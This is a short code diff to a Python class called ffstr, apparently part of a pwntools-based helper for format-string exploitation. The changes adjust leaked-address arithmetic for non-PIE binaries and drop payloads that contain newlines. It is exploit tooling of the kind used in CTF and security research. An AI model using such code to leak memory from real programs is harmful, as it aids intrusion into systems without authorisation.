@@ -466,8 +466,13 @@ class ffstr():
 				regex = re.search(self.re_HexaPattern, data)
 				if regex:
 					leak = int(regex[0],16)
+					
 			log.info("Leak "+hex(leak)+" ... Offset "+hex(offset)+" "+sym+" "+hex(addr))
 					
+			# address correction if no PIE
+			if not self.elf.pie:
+				addr -= leak-offset
+				
 			# Set payload
 			if self.bits == 32:
 				pos_arg = self.stack_arg+2+2
@@ -476,6 +481,10 @@ class ffstr():
 				pos_arg = self.stack_arg+1+2
 				pl = self.stackPayload(pos_arg,"s",size=8+8*2,left="    d34d",right="b33f    ")+p64(leak - offset + addr)
 					
+			# test is \n is present
+			if pl.find(b"\n")>-1:
+				continue
+				
 			# Get Data
 			data = b""
 			while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
